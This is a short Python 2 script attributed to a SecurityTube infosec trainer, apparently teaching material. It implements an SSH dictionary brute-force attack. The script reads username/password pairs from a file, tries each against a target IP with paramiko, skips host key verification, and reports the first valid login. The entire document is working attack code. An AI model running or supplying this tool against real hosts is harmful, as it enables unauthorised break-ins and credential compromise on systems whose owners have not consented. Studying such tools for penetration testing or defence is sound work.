#!/usr/bin/env python

"""
  Author: Vivek Ramachandran
	Website: http://SecurityTube.net
	Online Infosec Training: http://SecurityTube-Training.com

"""

import paramiko
import sys

def AttackSSH(ipAddress, dictionaryFile) :

	print "[+] Attacking Host : %s " %ipAddress

	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for line in open(dictionaryFile, "r").readlines() :

		[username, password] = line.strip().split()

		try :
			print "[+] Trying to break in with username: %s password: %s " % (username, password)
			ssh.connect(ipAddress, username=username, password=password)

		except paramiko.AuthenticationException:
			print "[-] Failed! ..."
			continue 

		print "[+] Success ... username: %s and passoword %s is VALID! " % (username, password)
		break


	
if __name__ == "__main__" :
	AttackSSH(sys.argv[1], sys.argv[2])